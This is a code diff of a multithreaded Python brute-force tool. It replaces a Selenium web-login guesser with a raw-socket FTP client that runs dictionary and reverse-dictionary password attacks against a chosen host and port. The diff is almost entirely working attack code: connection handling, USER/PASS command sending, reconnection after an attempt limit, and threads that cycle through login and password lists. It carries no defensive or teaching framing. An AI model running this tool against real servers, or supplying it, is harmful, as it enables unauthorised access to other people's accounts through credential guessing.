@@ -1,10 +1,9 @@
-from selenium.common.exceptions import NoSuchElementException
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium import webdriver
+import socket
 from queue import Queue
 from config import *
 import threading
 import time
+import sys
 
 
 
@@ -13,157 +12,134 @@ print_lock = threading.Lock()
 ### END PRINT LOCK ###
 
 
-class TargetObj:
-	url = str()
-	login_var = str()
-	pass_var = str()
-	failure_sign = str()
-	button_text = str()
+class Client:
+	def __init__(self, host = '', port = 21):
+		self.__host = socket.gethostbyname(host)
+		self.__port = port
+		self.__attempts_counter = 0
 
-	def __init__(self):
-		self.__driver = webdriver.Firefox()
-		self.__open_url();
-
-	def __open_url(self):
-		self.__driver.get(TargetObj.url)
-		self.__driver.implicitly_wait(10)
-
-	def __get_input(self, var_name):
-		return self.__driver.find_element_by_name(var_name)
-
-	def substitute_login(self, login):
-		def set_login_input():
-			self.__login_input = self.__get_input(TargetObj.login_var)
-			self.__login_input.clear()
-			self.__login_input.send_keys(login)
-		try:
-			set_login_input(login)
-		except NoSuchElementException:
-			try:
-				self.__open_url()
-				set_login_input(login)
-			except NoSuchElementException:
-				print(LOGIN_INPUT_ERROR)
-				self.__driver.close()
-
-	def substitute_password(self, password):
-		def set_pass_input():
-			self.__pass_input = self.__get_input(TargetObj.pass_var)
-			self.__pass_input.clear()
-			self.__pass_input.send_keys(password)
-		try:
-			set_pass_input(password)
-		except NoSuchElementException:
-			try:
-				self.__open_url()
-				set_pass_input(password)
-			except NoSuchElementException:
-				print(PASSWORD_INPUT_ERROR)
-				self.__driver.close()
+		# True of login attempt is successful
+		self.__success = False
 
 
-
-	def submit(self):
-		button_xpath = XPATH_CONTAINS.format('button'
-                                                    , '.'
-                                                    , TargetObj.button_text)
-		input_xpath = XPATH_CONTAINS.format('input'
-						    , '.'
-						    , TargetObj.button_text)
-		try:
-			button = self.__driver.find_element_by_xpath(button_xpath)
-			button.click()
-		except NoSuchElementException:
-			try:
-				button = self.__driver.find_element_by_xpath(input_xpath)
-				button.click()
-			except:
-				try:
-					self.__pass_input.submit()
-				except:
-					print(ATTEMPT_ERROR)
-					self.__driver.quit()
-		time.sleep(TIME_PAUSE)
-
-	def parse_response(self):
-		try:
-			body = self.__driver.find_element_by_tag_name("body")
-			if self.failure_sign in body.text:
-				return ON_FAIL_LOG
-			else:
-				return ON_SUCCESS_LOG
-		except:
-			return RESPONSE_PARSING_ERROR
-
-	def exit_driver(self):
-		self.__driver.quit()
+	def connect(self):
+		self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.__sock.connect((self.__host, self.__port))
+		welcome_message = self.__sock.recv(CHUNK_SIZE)
+		response_code = welcome_message[:3]
+		if response_code.decode() != FTP_CONNECTION_SUCCESS:
+			print(CONNECTION_ERROR)
+			exit(1)
 
 
+	def __check_connection(self):
+		if self.__attempts_counter == ATTEMPTS_LIMIT:
+			self.connect()
+			self.__attempts_counter = 0
 
 
-
-def login_attempt(target_obj, login, password):
-	target_obj.substitute_login(login)
-	target_obj.substitute_password(password)
-	target_obj.submit()
-	return target_obj.parse_response()
+	def __format_user_input(self, input):
+		return input.replace('\r', '').replace('\n', '')
 
 
+	def send_login(self, login):
+		self.__check_connection()
+		login = self.__format_user_input(login)
+		self.__sock.send(str.encode(FTP_USERNAME_CMD.format(login)))
+		self.__attempts_counter += 1
+		response = self.__sock.recv(CHUNK_SIZE)
+		response_code = response[:3]
+		self.__success = (response_code.decode() == FTP_LOGIN_SUCCESS)
 
-def dict_attack(target_obj, queue, password_list):
+
+	def send_password(self, password):
+		password = self.__format_user_input(password)
+		self.__sock.send(str.encode(FTP_PASSWORD_CMD.format(password)))
+		response = self.__sock.recv(CHUNK_SIZE)
+		response_code = response[:3]
+		self.__success = (response_code.decode() == FTP_LOGIN_SUCCESS)
+
+
+	def get_attempt_success(self):
+		return self.__success
+
+	def close_connection(self):
+		self.__sock.close()
+
+
+def login_attempt(target, login, password):
+	time.sleep(DELAY)
+	target.send_login(login)
+	target.send_password(password)
+	result = target.get_attempt_success()
+	if result:
+		return SUCCESS
+	else:
+		return FAILURE
+
+
+def dict_attack(target_client, queue, password_list):
 	"""
 	 Dictionary attack of target url based on
 	 default brute force (try all password for every login)
-	 e.g. login:pass1, login:pass2, login:pass3 and so on.
+	 e.g. login:pass1, login:pass2, login:pass3 etc.
 	"""
 	while True:
 		login = queue.get()
 		for passwd in password_list:
-			result = login_attempt(target_obj, login, passwd)
+			result = login_attempt(target_client, login, passwd)
 			with print_lock:
-				print(LOGIN_ATTEMPT.format(login, passwd, result))
+				print(LOGIN_ATTEMPT.format(result, login, passwd))
 		queue.task_done()
 
 
-def reverse_dict_attack(target_obj, login_list, queue):
+def reverse_dict_attack(target_client, login_list, queue):
 	while True:
 		password = queue.get()
 		for login in login_list:
-			result = login_attempt(target_obj, login, password)
+			result = login_attempt(target_client, login, password)
 			with print_lock:
-				print(LOGIN_ATTEMPT.format(login, password, result))
+				print(LOGIN_ATTEMPT.format(result, login, password))
 		queue.task_done()
 
 
 
-def brute_force(logins, passwords, num_threads, reverse = False):
+def brute_force(host
+				, port
+				, logins
+				, passwords
+				, num_threads
+				, reverse = False):
+
 	queue = Queue()
-	# list with objects of TargetObj class #
-	target_objs = []
+
+	# List of created Target classes
+	clients = []
+
 	if reverse == False:
+
 		for login in logins:
 			queue.put(login)
+
 		for thread_counter in range(num_threads):
-			# creating target object with driver for each thread #
-			obj_per_thread = TargetObj()
-			target_objs.append(obj_per_thread)
+
+			# Creating client with socket for each thread
+			client_per_thread = Client(host, port)
+			client_per_thread.connect()
+			clients.append(client_per_thread)
 			thrd = threading.Thread(target = dict_attack
-                                    , args = (obj_per_thread, queue, passwords))
+                                    , args = (client_per_thread, queue, passwords))
 			thrd.daemon = True
 			thrd.start()
 	else:
 		for passwd in passwords:
 				queue.put(passwd)
 		for thread_counter in range(num_threads):
-			obj_per_thread = TargetObj()
-			target_objs.append(obj_per_thread)
+			client_per_thread = Client(host, port)
+			client_per_thread.connect()
 			thrd = threading.Thread(target = reverse_dict_attack
-                                    , args = (obj_per_thread, logins, queue))
+                                    , args = (client_per_thread, logins, queue))
 			thrd.daemon = True
 			thrd.start()
 
 	queue.join()
-
-	# quit drivers #
-	for obj in target_objs:
-		obj.exit_driver();
